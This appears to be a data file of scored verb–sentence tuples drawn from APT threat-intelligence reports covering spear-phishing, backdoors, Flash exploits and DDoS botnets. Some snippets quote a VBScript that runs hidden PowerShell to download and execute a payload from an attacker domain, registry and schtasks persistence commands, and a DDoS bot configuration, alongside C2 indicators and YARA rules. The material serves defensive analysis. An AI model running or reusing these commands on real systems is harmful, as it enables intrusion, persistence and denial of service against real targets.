is\n"uyghurinfo[.]com"')(0.7272727272727273, 'directed', "\n\nHere's an example of a targeted spear-phishing e-mail directed at Uyghur activists in March 2014")(0.9375, 'has', '\n\n\n<figure></figure>\n\nThe e-mail has two attachments, a non-malicious JPG file and a 373 KB Microsoft Word .DOC file')(1.0, 'make', '\n<table>\n           Name                      WINDOWSUPDATANEY.DLL\n           MD5                       c13c79ad874215cfec8d318468e3d116\n           Size                      37,888 bytes\n</table>\nIt is registered as a service (named "Windowsupdata") through a Windows Batch file named "DOT.BAT"\n(detected by Kaspersky Lab products as Trojan.BAT.Tiny.b):\n<figure>\n @echo off\n @reg add\n</figure>\n<figure>\n @echo off\n\n @reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost" /v\n Windowsupdata /t REG_MULTI_SZ /d Windowsupdata /f\n\n @reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata" /v\n ImagePath /t REG_EXPAND_SZ /d %SystemRoot%\\System32\\svchost.exe -k Windowsupdata /f\n\n @reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata" /v\n DisplayName /t REG_SZ /d Windowsupdata /f\n\n @reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata" /v\n ObjectName /t REG_SZ /d LocalSystem /f\n\n @reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata" /v\n ErrorControl /t REG_DWORD /d 1 /f\n\n @reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata" /v Start /t\n REG_DWORD /d 2 /f\n\n @reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata\\Parameters"\n /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\\system32\\Windowsupdataney.dll /f\n</figure>\nTo   make sure the malware isn\'t running multiple times, it uses the mutex "SD_2013 Is Running!" to mark\nits presence in the system')(0.3870967741935484, 'contains', '\n\n<figure></figure>\n\n\nThe Base64-encoded data still contains information including the victim’s hostname and IP address but\nalso a “mark” or “campaign tag/code” that the threat actors use to keep track of their various attacks')(0.6666666666666666, 'evade', '\n\x0c\n\n<figure></figure>\n\nThis sample (aa873ed803ca800ce92a39d9a683c644) exhibited network traffic that does not match the\nearlier pattern and therefore may evade existing network traffic signatures designed to detect Ixeshe\nrelated infections')(1.0, 'generated', ' Older variants of this malware family generated the\nfollowing POST request:\n<list>\nPOST /bbs/info.asp HTTP/1.1\n</list>\nData sent via this POST request transmitted in clear text in the following structure:\n<list>\n<VICTIM BIOS NAME>|<CAMPAIGN ID>|<VICTIM EXTERNAL IP>|<VICTIM OS>|\n</list>\nA recently observed malware sample (hash value 832f5e01be536da71d5b3f7e41938cfb) appears to be a\nmodified variant of Aumlib')(0.41379310344827586, 'uses', '\n\nAnd a new version of Ixeshe, which has been in service since 2009 to attack targets in East Asia, uses new\nnetwork traffic patterns, possibly to evade traditional network security systems')(0.1875, 'encodes', '\n\nAumlib, which for years has been used in targeted attacks, now encodes certain HTTP communications')(0.625, 'connected', ' The sample cb3dcde34fd9ff0e19381d99b02f9692 connected to\ndocuments[.]myPicture[.]info and www[.]documents[.]myPicture[.]info and as expected generated the a\nPOST request to /bbs/info.asp')(0.6363636363636364, 'generated', ' The sample cb3dcde34fd9ff0e19381d99b02f9692 connected to\ndocuments[.]myPicture[.]info and www[.]documents[.]myPicture[.]info and as expected generated the a\nPOST request to /bbs/info.asp')(0.5, 'deployed', ' About four months after The New York Times\npublicized an attack on its network, the attackers behind the intrusion deployed updated versions of their\nBackdoor.APT.Aumlib and Backdoor.APT.Ixeshe malware families <fn>[2]</fn>')(0.8571428571428571, 'communicate', " Most of these components don't embed their own C&C information but\nrather communicate with their controllers through the original backdoor process")(0.4375, 'gathering', ' We have, for instance, observed components dedicated to stealing login credentials from\nthe victim machine and components dedicated to gathering further information on the compromised\nsystem like the presence of antivirus software or a firewall')(0.8888888888888888, 'stealing', ' We have, for instance, observed components dedicated to stealing login credentials from\nthe victim machine and components dedicated to gathering further information on the compromised\nsystem like the presence of antivirus software or a firewall')(0.9230769230769231, 'proceed', ' The dropper will proceed to decrypt this DLL, write it to disk and\nexecute it')(0.5882352941176471, 'bypass', ' By using a separate wrapper, the malicious actors are able to bypass any integrity checks the\noriginal binary might contain')(0.4444444444444444, 'abuse', ' This DLL file (SHA1\nd433f281cf56015941a1c2cb87066ca62ea1db37, detected as Backdoor:W32/OnionDuke.A) contains\namong its configuration data a different hardcoded C&C domain, overpict.com and also evidence\nsuggesting that this component may abuse Twitter as an additional C&C channel')(0.06666666666666667, 'contains', ' This DLL file (SHA1\nd433f281cf56015941a1c2cb87066ca62ea1db37, detected as Backdoor:W32/OnionDuke.A) contains\namong its configuration data a different hardcoded C&C domain, overpict.com and also evidence\nsuggesting that this component may abuse Twitter as an additional C&C channel')(0.36363636363636365, 'receive', ' From these C&Cs the malware may\nreceive instructions to download and execute additional malicious components')(0.29411764705882354, 'is', ' This executable is a dropper containing a PE\nresource that pretends to be an embedded GIF image file')(0.8333333333333334, 'pretends', ' This executable is a dropper containing a PE\nresource that pretends to be an embedded GIF image file')(0.6923076923076923, 'connect', '\n\x0c\n\n<figure></figure>\n\n<caption>A flowchart of the infection process</caption>\n\n\nOnce executed, the DLL file (SHA1: b491c14d8cfb48636f6095b7b16555e9a575d57f, detected as\nBackdoor:W32/OnionDuke.B) will decrypt an embedded configuration (shown below) and attempt to\nconnect to hardcoded C&C URLs specified in the configuration data')(0.7272727272727273, 'distribute', '\n\nBy exploiting and co-opting Afghan network infrastructure that is used by multiple ministerial level\nwebsites, Chinese intelligence services would be able to widely distribute malicious payloads to a variety of\nglobal targets using Afghanistan’s government websites as a topical and trusted distribution platform,\nexploiting a single hidden entry point')(1.0, 'being', ' This being a variant of a typical “watering-hole” attack, the\nattackers will most likely infect victims outside the Afghan government who happened to be browsing any\none of the CDN client systems, specifically, partner states involved in the planned troop reduction')(0.6428571428571429, 'leveraged', '\n</section>\n<section>\n<heading>Afghan Government “Watering Hole”</heading>\n\nThe ThreatConnect Intelligence Research Team (TCIRT) recently observed a targeted cross-site scripting\n(XSS) “drive-by” attack that leveraged a single content delivery network resource to distribute a malicious\nJava applet via nearly all of the major official Government of Afghanistan websites')(0.6470588235294118, 'downloads', ' This applet has the same class path, and\ndownloads an XOR 0xFF encoded payload executable from the URL [https:]//amco-\ntriton.co[.]jp/js/dl/in.jpg')(0.75, 'loads', '\n\nThis executable drops the following files:\n<list>\n      SHA1: 2068260601D60F07829EE0CEDF5A9C636CDB1765 (dllhost.exe)\nLegitimate Microsoft Debugging Tools for Windows Executable, loads dbgeng.dll\n      SHA1: E2D93ABC4C5EDE41CAF1C0D751A329B884D732A2 (dbgeng.dll)\n</list>\nMalicious DLL that loads into the above dllhost.exe, using a similar DLL sideloading technique to that\nmost commonly associated with the PlugX backdoor')(0.8235294117647058, 'using', '\n\nThis executable drops the following files:\n<list>\n      SHA1: 2068260601D60F07829EE0CEDF5A9C636CDB1765 (dllhost.exe)\nLegitimate Microsoft Debugging Tools for Windows Executable, loads dbgeng.dll\n      SHA1: E2D93ABC4C5EDE41CAF1C0D751A329B884D732A2 (dbgeng.dll)\n</list>\nMalicious DLL that loads into the above dllhost.exe, using a similar DLL sideloading technique to that\nmost commonly associated with the PlugX backdoor')(0.19230769230769232, 'drops', '\n\nThis executable drops the following files:\n<list>\n      SHA1: 2068260601D60F07829EE0CEDF5A9C636CDB1765 (dllhost.exe)\nLegitimate Microsoft Debugging Tools for Windows Executable, loads dbgeng.dll\n      SHA1: E2D93ABC4C5EDE41CAF1C0D751A329B884D732A2 (dbgeng.dll)\n</list>\nMalicious DLL that loads into the above dllhost.exe, using a similar DLL sideloading technique to that\nmost commonly associated with the PlugX backdoor')(0.5, 'connected', ' The deflated exe was a variant of the same downloader described above and\nconnected to 198.55.115.71 over port 1913 via SOCKS5 proxy')(0.5454545454545454, 'was', ' The deflated exe was a variant of the same downloader described above and\nconnected to 198.55.115.71 over port 1913 via SOCKS5 proxy')(0.8, 'requests', ' The malware then requests a connection to 192.184.60.229 on TCP port 81 using the\ncommand "05 01 00 01 c0 b8 3c e5 00 51" and verifies that the first two bytes from the server are "05 00"\n(c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order)')(0.8461538461538461, 'establishes', '\n\nThe malware component, test.exe, uses the Windows command "cmd.exe" /C whoami” to verify it is\nrunning with the elevated privileges of “System” and creates persistence by creating the following\nscheduled task:\n<list>\n  schtasks /create /tn "mysc" /tr C:\\Users\\Public\\test.exe /sc ONLOGON         /ru "System"\n</list>\nWhen executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port\n1913')(0.8260869565217391, 'uses', '\n\nThe malware component, test.exe, uses the Windows command "cmd.exe" /C whoami” to verify it is\nrunning with the elevated privileges of “System” and creates persistence by creating the following\nscheduled task:\n<list>\n  schtasks /create /tn "mysc" /tr C:\\Users\\Public\\test.exe /sc ONLOGON         /ru "System"\n</list>\nWhen executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port\n1913')(0.3076923076923077, 'creates', '\n\nThe malware component, test.exe, uses the Windows command "cmd.exe" /C whoami” to verify it is\nrunning with the elevated privileges of “System” and creates persistence by creating the following\nscheduled task:\n<list>\n  schtasks /create /tn "mysc" /tr C:\\Users\\Public\\test.exe /sc ONLOGON         /ru "System"\n</list>\nWhen executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port\n1913')(0.75, 'connected', ' The secondary payload in that case was\ndetected as Backdoor.APT.CookieCutter (aka Pirpi) and also named newnotepad.exe (MD5\n8849538ef1c3471640230605c2623c67) and connected to the known APT3 domains:\n<list>\n  inform.bedircati[.]com\n\n  pn.lamb-site[.]com\n\n  210.109.99.64\n</list>\n\x0cThe 192.184.60.229 IP address seen in this current campaign also hosts securitywap[.]com – another\nknown domain referenced in our Operation Clandestine Fox blog')(0.42857142857142855, 'write', '\n</section>\n<section>\n<heading>The Downloader</heading>\n\nAfter the exploit or script executes, the system downloads install.exe, which has the following metadata:\n<list>\nMD5           5a0c4e1925c76a959ab0588f683ab437\n\nSize         46592 bytes\n\nCompile Time 2014-11-19 08:55:10Z\n\nImport Hash      6b8611f8148a6b51e37fd68e75b6a81c\n</list>\nThe file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path\n“C:\\Users\\Public”, which fails on Windows XP because that path is not present by default')(0.5454545454545454, 'send', '<doc>\n<section>\n<heading>Operation Double Tap</heading>\n\nAPT3 (also known as UPS), the actors responsible for Operation Clandestine Fox has quietly continued to\nsend waves of spearphishing messages over the past few months')(0.5833333333333334, 'sending', ' The file is saved to:\n\n               C:\\Users\\\n               [Username]\\AppData\\Local\\Temp\\notepad.exe\n 00 00 04      Content after command ID is written to:\n\n               C:\\Users\\\n               [Username]\\AppData\\Local\\Temp\\notepad2.exe\n 00 00 05      The files notepad1.exe and notepad2.exe are\n               concatenated together and written to C:\\Users\\\n               [Username]\\AppData\\Local\\Temp\\newnotepad.exe\n               and executed\n 00 00 06      The contents of the following file is sent to the\n               server:\n\n               C:\\Users\\\n               [Username]\\AppData\\Local\\Temp\\note.txt\n 00 00 07      The string following the command ID is executed\n               using "cmd /C" and results are sent to server\n</table>\n</section>\n<section>\n<heading>Links to APT3</heading>\n\nOn October 28, we observed APT3 sending out spearphishing messages containing a compressed\nexecutable attachment')(0.6153846153846154, 'sends', ' The malware sends the SOCKS5 connection request "05 01 00" and verifies the server response\nstarts with "05 00"')(0.5384615384615384, 'is', ' CVE-2014-\n4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14')(0.6111111111111112, 'expects', '\n\nOnce the connection to the server is established, the malware expects a message containing at least three\nbytes from the server')(0.7, 'contains', '\n\nThe first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe\nwith the elevated privileges')(0.6153846153846154, 'execute', '\n\nThe first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe\nwith the elevated privileges')(0.4666666666666667, 'give', ' This CVE is\na local kernel vulnerability that, with successful exploitation, would give any user SYSTEM access on the\nmachine')(0.8181818181818182, 'served', '\n\nThis IP has hosted other domains used by APT3 in past campaigns:\n<table>\n DOMAIN                     FIRST SEEN     LAST SEEN        IP ADDRESS\n join.playboysplus[.]com    2014-11-21     2014-11-21       104.151.248.173\n walterclean[.]com          2014-11-18     2014-11-20       104.151.248.173\n www.walterclean[.]com      2014-11-18     2014-11-20       104.151.248.173\n</table>\nAs we discussed in our previous blog detailing previous APT3 activity, the walterclean[.]com served as a\nPlugx/Kaba command and control server')(0.8, 'attack', '\n</section>\n<section>\n<heading>Conclusion</heading>\n\nAlthough APT3 is well known for employing zero-day exploits in their attacks, recent activity has\ndemonstrated that they will also attack targets with known exploits or social engineering')(0.8333333333333334, 'is', ' CVE-2014-6332 was disclosed publicly on\n2014-11-11 and is a Windows OLE Automation Array Remote Code Execution vulnerability')(0.6666666666666666, 'download', '\n\nThe webpage contained both CVE-2014-6332 exploit code and a VBScript that invoked PowerShell on the\naffected users’ system to download the below payload:\n<code>\n\n  function runmumaa()\n\n  On Error Resume Next\n\n  set shell=createobject("Shell.Application")\n\n  shell.ShellExecute "powershell.exe","-NoLogo -NoProfile             -NonInteractive -WindowStyle\nHidden ( New-Object\n“System.Net.WebClient”).DownloadFile(“http://www.playboysplus.com\n\x0c/install/install.exe”,”install.exe”);Invoke-Item install.exe", "",   "open", 1\n\n  end function\n</code>\nThe CVE-2014-6332 exploit code seen in this incident is derived from the code published at\nhttp://www.exploit-db.com/exploits/35230/, which has also been incorporated in the Metasploit project')(0.11764705882352941, 'based', ' Type S is a .NET application based\non the same source code and shared C&C infrastructure as Type T')(0.35714285714285715, 'executing', ' Emdivi allows the remote\nattacker executing the commands to send the results back to the command-and-control (C&C) server\nthrough HTTP')(0.6923076923076923, 'send', ' Emdivi allows the remote\nattacker executing the commands to send the results back to the command-and-control (C&C) server\nthrough HTTP')(0.8666666666666667, 'trick', ' This is merely to trick the recipient into believing the email is from a\nlegitimate and trustworthy source')(0.7777777777777778, 'uses', ' The malware adds extra words to the version number and then, based on this,\ngenerates a hash, which it uses as an encryption key')(0.38461538461538464, 'generates', ' The malware adds extra words to the version number and then, based on this,\ngenerates a hash, which it uses as an encryption key')(1.0, 'drop', ' Opening the malicious attachment\nwith Ichitaro will drop the payload and display the document')(0.3333333333333333, 'detects', ' Type T also\ndetects the presence of automatic analysis systems or debuggers, such as the following:\n<list>\n      VirtualMachine\n      Debugger\n      Sandbox\n</list>\nType S, on the other hand, was used only twice in the attack campaign')(0.5555555555555556, 'opens', ' Attached “document” is actually a malicious executable file</caption>\n</section>\n<section>\n<heading>Payload</heading>\nThe malicious payload is Backdoor.Emdivi, a threat that opens a back door on the compromised\ncomputer')(0.2, 'is', ' Attached “document” is actually a malicious executable file</caption>\n</section>\n<section>\n<heading>Payload</heading>\nThe malicious payload is Backdoor.Emdivi, a threat that opens a back door on the compromised\ncomputer')(0.8571428571428571, 'employs', ' Type T employs\ntechniques to protect itself from security vendors or network administrators')(0.8461538461538461, 'requests', ' The email also requests that the recipient open the attachment on a Windows computer')(0.8, 'steal', ' Payloads from the exploit may\ninclude Backdoor.Emdivi, Backdoor.Korplug, and Backdoor.ZXshell; however, all payloads aim to steal\nconfidential information from the compromised computer')(0.8, 'include', ' Payloads from the exploit may\ninclude Backdoor.Emdivi, Backdoor.Korplug, and Backdoor.ZXshell; however, all payloads aim to steal\nconfidential information from the compromised computer')(0.75, 'installed', ' Once successfully exploited, the file installed Backdoor.Emdivi')(0.8333333333333334, 'are', ' Mostly the attachments are in a simple executable format with a fake icon')(0.4444444444444444, 'turned', ' Instead,\nthe attacker somehow penetrated the cloud service itself and turned the websites into C&C servers for\nBackdoor.Emdivi')(0.5555555555555556, 'steal', ' This group’s primary goal is to steal confidential information from\ntargeted organizations')(0.875, 'sent', ' The attackers sent a Microsoft Word file containing a maliciously crafted SWF file\nthat exploited the vulnerability')(0.3, 'install', ' Malformed SWF file used in the LadyBoyle campaign in February 2013</caption>\n\nBoth attacks use a .doc file containing an Adobe Flash zero-day exploit that is used to install a back door')(0.5384615384615384, 'arrive', ' All attacks arrive on the target computers as an\nattachment to email messages')(0.8, 'include', ' The emails include password-protected .zip files containing the malware')(0.4, 'downloads', ' Once ROP marks the shellcode as executable\nusing Windows’ VirtualProtect function, it downloads an executable via the InternetOpenURLA and\nInternetReadFile functions')(0.34375, 'use', '\n\nOn Windows 7, the attackers use a hard-coded ROP chain for MSVCR71.dll (Visual C++ runtime) if the\nuser has Java 1.6, and a hard-coded ROP chain for HXDS.dll (Help Data Services Module) if the user has\nMicrosoft Office 2007 or 2010')(0.6153846153846154, 'connecting', '\n<table>\nDomain                  First Seen    Last Seen        IP Address\nadservice.no-ip[.]org   2014-02-18    2014-02-19       74.126.177.68\njava.ns1[.]name         2014-02-18    2014-02-19       74.126.177.68\njava.ns1[.]name         2014-02-18    2014-02-18       192.74.246.219\nwmi.ns01[.]us           2014-02-17    2014-02-17       192.74.246.219\nproxy.ddns[.]info       2013-05-02    2014-02-18       103.246.246.103\n\x0cupdatedns.ns02[.]us 2013-09-06       2013-09-06      103.246.246.103\nupdatedns.ns01[.]us 2013-09-06       2013-09-06      103.246.246.103\nwmi.ns01[.]us       2013-07-04       2013-07-15      103.246.246.103\n</table>\nFurther research uncovered a number of older malware samples connecting to the same domain\nwmi.ns01[.]us')(0.8333333333333334, 'writes', ' Then it writes the file to disk with CreateFileA and WriteFile functions')(0.625, 'dropped', ' This jar file exploited CVE-2012-0507 and\ndropped a Poison Ivy payload with the hash (MD5 52aa791a524b61b129344f10b4712f52)')(0.8333333333333334, 'deploys', '\n\nThis actor also has early access to a number of zero-day exploits, including Flash and Java, and deploys a\nvariety of malware families on compromised systems')(0.5, 'infect', '\n\nThe group behind this campaign appears to have sufficient resources (such as access to zero-day exploits)\nand a determination to infect visitors to foreign and public policy websites')(0.6666666666666666, 'build', '\n\nFor Windows XP, the attackers build a return-oriented programming (ROP) chain of MSVCRT (Visual C\nruntime) gadgets with hard-coded base addresses for English (“en”) and Chinese (“zh-cn” and “zh-tw”)')(0.75, 'uses', '\n</section>\n<section>\n<heading>ASLR bypass</heading>\n\nThe attack uses only known ASLR bypasses')(0.8666666666666667, 'overwrite', ' The vulnerability permits an\nattacker to overwrite the vftable pointer of a Flash object to redirect code execution')(0.8181818181818182, 'connected', ' This Poison Ivy\nvariant connected to a CnC server at ids.ns01[.]us')(0.5555555555555556, 'connected', ' In addition\nto using the same password “java7,” this variant was configured with the mutex with the similar pattern of\n“YFds*&^ff” and connected to a CnC server at windows.ddns[.]us')(0.6666666666666666, 'infect', ' The threat actors likely sought\nto infect users to these sites for follow-on data theft, including information related to defense and public\npolicy matters')(0.75, 'dropped', ' This exploit, in turn, dropped the Poison Ivy variant')(0.5714285714285714, 'runs', '\nFinally, it runs the file using the WinExec function')(0.8, 'decoded', ' This PlugX variant connected to a Google Code project\nat code.google[.]com/p/udom/, where it decoded a command that configured its C2 server')(0.42105263157894735, 'connected', ' This PlugX variant connected to a Google Code project\nat code.google[.]com/p/udom/, where it decoded a command that configured its C2 server')(0.4, 'flood', '\n\nFor approximately 14 hours between October 23rd and 24th, the attackers pushed a configuration update\nto four controls servers that instructed bots under their control to flood 124.217.214.149 with UDP traffic')(0.29411764705882354, 'instructed', '\n\nFor approximately 14 hours between October 23rd and 24th, the attackers pushed a configuration update\nto four controls servers that instructed bots under their control to flood 124.217.214.149 with UDP traffic')(0.47619047619047616, 'pushed', '\n\nFor approximately 14 hours between October 23rd and 24th, the attackers pushed a configuration update\nto four controls servers that instructed bots under their control to flood 124.217.214.149 with UDP traffic')(0.6111111111111112, 'encode', ' The following snippet of python\ncode can be used to decode this command:\n<code>\nb64encoded = request.content.rstrip(\'@$@\').lstrip(\'@$@\')\nb64decoded = b64encoded.decode("base64")\n\n\ncommand = ""\n\n\nfor c in b64decoded:\n           x = ord(c)\n           x = x ^ XOR_key\n           command += chr(x)\n</code>\n\x0cFireEye has observed two different single-byte XOR keys used to encode configuration files issued by the\nDDOS C2 servers in this campaign')(0.75, 'connected', ' This sample is detected as Backdoor.APT.Preshin and connected to luxscena[.]com\nfor C2')(0.5384615384615384, 'receive', '\n</section>\n<section>\n<heading>Ongoing DDoS Attacks Target the Pro-Democracy Movement</heading>\n\nFireEye has identified a number of binaries coded to receive instructions from a set of command and\ncontrol (C2) servers instructing participating bots to attack Next Media-owned websites and the\nHKGolden forum')(0.65, 'instructing', '\n</section>\n<section>\n<heading>Ongoing DDoS Attacks Target the Pro-Democracy Movement</heading>\n\nFireEye has identified a number of binaries coded to receive instructions from a set of command and\ncontrol (C2) servers instructing participating bots to attack Next Media-owned websites and the\nHKGolden forum')(0.8888888888888888, 'launched', '\n\nIn recent weeks, attackers have launched a series of Distributed Denial of Service attacks (DDoS) against\nwebsites promoting democracy in Hong Kong')(0.8333333333333334, 'instructing', ' 23, 2014, two of the active controls began instructing participating bots to cease attacks')(0.4666666666666667, 'target', '\nBoth of these certificates are valid but can be detected and blocked via the following Yara signatures:\n<code>\nrule callTogether_certificate\n{\n    meta:\n      author = "Fireeye Labs"\n      version = "1.0"\n      reference_hash = "d08e038d318b94764d199d7a85047637"\n      description = “detects binaries signed with the CallTogether certificate”\n\x0c    strings:\n      $serial = {452156C3B3FB0176365BDB5B7715BC4C}\n      $o = "CallTogether, Inc."\n    condition:\n      $serial and $o\n}\n\n\nrule qti_certificate\n{\n      meta:\n           author = "Fireeye Labs"\n           reference_hash = "cfa3e3471430a0096a4e7ea2e3da6195"\n           description = "detects binaries signed with the QTI International Inc\ncertificate"\n      strings:\n           $cn = "QTI International Inc"\n           $serial = { 2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9 }\n      condition:\n           $cn and $serial\n}\n</code>\nThese ongoing DDoS attacks and previous APT intrusion activity both target the hkgolden[.]com website')(0.36363636363636365, 'issued', ' These configurations issued commands to attack the following domains and\nIPs:\n<list>\nnxapi.appledaily.com[.]hk\n202.85.162.90\n58.64.139.10\n202.85.162.97\n202.85.162.81\n198.41.222.6\n202.85.162.101\n202.85.162.95\n202.85.162.180\n202.85.162.140\n202.85.162.130\n124.217.214.149\n</list>\nAll of the above IPs host Next Media or Apple daily websites, with the exception of 58.64.139.10 and\n124.217.214.149')(0.8, 'suffered', ' According to the Wall Street Journal, websites belonging to\nNext Media’s Apple Daily publication have suffered from an ongoing DDoS attack that “brought down its\nemail system for hours”')(0.6666666666666666, 'detect', ' We also detect\nthis payload as Backdoor.APT.PISCES and observed it connect to u.java-se[.]com')(0.6, 'connect', ' We also detect\nthis payload as Backdoor.APT.PISCES and observed it connect to u.java-se[.]com')(0.6666666666666666, 'issued', ' 24, 2014, after attacking their own infrastructure,\nthe attackers issued new instructions to their botnet that ceased all attacks')(1.0, 'drop', ' Structurally, all of\nthese samples are similar in that they drop three files:\n<list>\n•          ctfmon.exe-a legitimate, signed copy of the Pidgin IM client\n           (md5 hash = 1685f978149d7ba8e039af9a4d5803c7)\n•          libssp-0.dll–malware DLL which is side-loaded by ctfmon.exe\n           to decode and launch KernelBot')(0.8, 'issued', ' The encoded configuration\nfile shown above decodes to:\n<list>\n[KernelSetting]\nIsReportState=0\nIsDownFileRun0=0\nCmdID0=1\nDownFileRunUrl0=http://10.0.1.151/1.exe\n[UpdateServer]\nNewVersion=20140926\nUpdateFileUrl=http://10.0.1.151/1.exe\n[DDOS_HostStatistics]\nCountUrl=\nTimer=2\n[DDOS_ScriptFlood]\nIsScriptFlood=1\nCmdID=123\nScriptFloodDNS=\nScriptFloodUrl=http://nxapi.appledaily.com.hk/\nScriptFloodPort=80\nIsGetUrlFile=1\nIsSendPacket=0\nThreadLoopTime=5\nThreadCount=10\nTimer=360\nIsTimer=1\n[DDOS_ScriptFlood_A1]\nIsScriptFlood=0\nCmdID=1\nScriptFloodDNS=10.0.1.151\nScriptFloodUrl=10.0.1.151/1.html\nScriptFloodPort=80\nIsGetUrlFile=1\nIsSendPacket=1\nThreadLoopTime=1\nThreadCount=1\n\x0cTimer=20\nIsTimer=1\n[DDOS_UdpFlood]\nIsUdpFlood=0\nCmdID=1\nUdpFloodDNS=10.0.1.151\nThreadCount=1\nTimer=20\nIsTimer=1\n[DDOS_UdpFlood_A1]\nIsUdpFlood=0\nCmdID=1\nUdpFloodDNS=10.0.1.151\nThreadCount=1\nTimer=20\nIsTimer=1\n[DDOS_SynFlood]\nIsSynFlood=0\nCmdID=1\nSynFloodDNS=10.0.1.151\nSynFloodPort=80\nThreadCount=1\nTimer=20\nIsTimer=1\n[DDOS_TcpFlood]\nIsTcpFlood=0\nCmdID=1\nTcpFloodDNS=10.0.1.151\nTcpFloodPort=80\nIsSendPacket=1\nThreadCount=1\nTimer=20\nIsTimer=1\n[DDOS_TcpFlood_A1]\nIsTcpFlood=0\nCmdID=1\n\x0cTcpFloodDNS=10.0.1.151\nTcpFloodPort=80\nIsSendPacket=1\nThreadCount=6\nTimer=20\nIsTimer=1\n</list>\nDuring the course of our research, we’ve observed more than 30 different unique configuration files issued\nby the C2 servers listed above')(0.8666666666666667, 'receive', '\n•          readme.txt – a binary file which contains the XOR-encoded\n           KernelBot DLL as well as C2 destination information (most have\n           md5 hash of b5ac964a74091d54e091e68cecd5b532)\n</list>\nThe KernelBot implants receive targeting instructions from C2 servers hard-coded directly into the\nsample')(0.8, 'connects', ' For example, c3d6450075d618b1edba17ee723eb3ca drops a KernelBot variant that connects to\nboth www.sapporo-digital-photoclub[.]com and wakayamasatei[.]com')(0.4166666666666667, 'drops', ' For example, c3d6450075d618b1edba17ee723eb3ca drops a KernelBot variant that connects to\nboth www.sapporo-digital-photoclub[.]com and wakayamasatei[.]com')(1.0, 'detect', ' We detect\nthis payload as Backdoor.APT.PISCES and it used hk.java-se[.]com for C2')(0.6666666666666666, 'used', ' We detect\nthis payload as Backdoor.APT.PISCES and it used hk.java-se[.]com for C2')(0.5555555555555556, 'drop', ' Each sample we identified is signed with digital\ncertificates that have also been used by APT actors to sign binaries in previous intrusion operations:\n<figure></figure>\n\x0cThese binaries are W32 Cabinet self-extracting files that drop a variant of an older DDoS tool known as\nKernelBot ')(0.3125, 'suffered', ' According to other reports, Next Media’s network has suffered a “total failure” as\na result of these attacks')(0.8, 'called', ' This particular variant called back to a command and control server located at\nnewss[.]effers[.]com')(0.36363636363636365, 'creates', ' Then,\nwhen the shellcode is executed, the malware creates files “sqlrenew.txt” and “stream.exe”')(0.4, 'begin', ' The attacker then overwrites the vftable\npointer of a flash.Media.Sound() object in memory to point to the pivot and begin ROP')(0.8666666666666667, 'connecting', ' We also observed another “HTTPS” Gh0st variant connecting to\na related command and control server at me[.]scieron[.]com')(0.6363636363636364, 'modify', ' The\nvulnerability allows the attacker to modify one byte of memory at an arbitrary address')(0.375, 'dropped', '\n</section>\n<section>\n<heading>ZxShell payload analysis</heading>\n\nAs documented above, this exploit dropped an XOR (0×95) payload that executed a ZxShell backdoor\n(MD5: 8455bbb9a210ce603a1b646b0d951bce)')(0.6153846153846154, 'executed', '\n</section>\n<section>\n<heading>ZxShell payload analysis</heading>\n\nAs documented above, this exploit dropped an XOR (0×95) payload that executed a ZxShell backdoor\n(MD5: 8455bbb9a210ce603a1b646b0d951bce)')(0.25, 'calling', '\n</section>\n<section>\n<heading>Infrastructure analysis</heading>\n\nThe info[.]flnet[.]org domain overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via the previous\nresolutions to the following IP addresses:\n<list>\n      58.64.200.178\n      58.64.200.179\n      103.20.192.4\n</list>\n<table>\nFirst Seen       Last Seen         CnC Domain           IP\n2013-08-31       2013-08-31        icybin.flnet[.]org   58.64.200.178\n2013-05-02       2013-08-02        info.flnet[.]org     58.64.200.178\n2013-08-02       2013-08-02        book.flnet[.]org     58.64.200.178\n2013-08-10       2013-08-10        info.flnet[.]org     58.64.200.179\n2013-07-15       2013-07-15        icybin.flnet[.]org   58.64.200.179\n2014-01-02       2014-01-02        book.flnet[.]org     103.20.192.4\n2013-12-03       2014-01-02        info.flnet[.]org     103.20.192.4\n</table>\nWe previously observed Gh0stRat samples with the custom packet flag “HTTPS” calling back to\nbook[.]flnet[.]org and icybin[.]flnet[.]org')(0.08333333333333333, 'used', '\n\nThe ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to\ncyber espionage operations')(0.3684210526315789, 'searches', '\n</section>\n<section>\n<heading>Code execution</heading>\n\nOnce the attacker’s code has full memory access through the corrupted Flash Vector object, the code\nsearches through loaded libraries gadgets by machine code')(0.75, 'use', '\n</section>\n<section>\n<heading>ASLR bypass</heading>\n\nBecause the vulnerability allows attackers to modify memory to an arbitrary address, the attacker can use\nit to bypass ASLR')(1.0, 'modify', '\n</section>\n<section>\n<heading>ASLR bypass</heading>\n\nBecause the vulnerability allows attackers to modify memory to an arbitrary address, the attacker can use\nit to bypass ASLR')(0.23809523809523808, 'uses', ' The attacker uses\nthe vulnerability to do the following:\n<list>\n      Gain access to memory from Flash ActionScript, bypassing address space layout randomization\n      (ASLR)\n      Pivot to a return-oriented programing (ROP) exploit technique to bypass data execution prevention\n      (DEP)\n</list>\n</section>\n\n\x0c\n<section>\n<heading>EMET detection</heading>\n\nThe attacker uses the Microsoft.XMLDOM ActiveX control to load a one-line XML string containing a file\npath to the EMET DLL')(0.5294117647058824, 'deploy', ' government entities\n      Japanese firms\n      Defense industrial base (DIB) companies\n      Law firms\n      Information technology (IT) companies\n      Mining companies\n      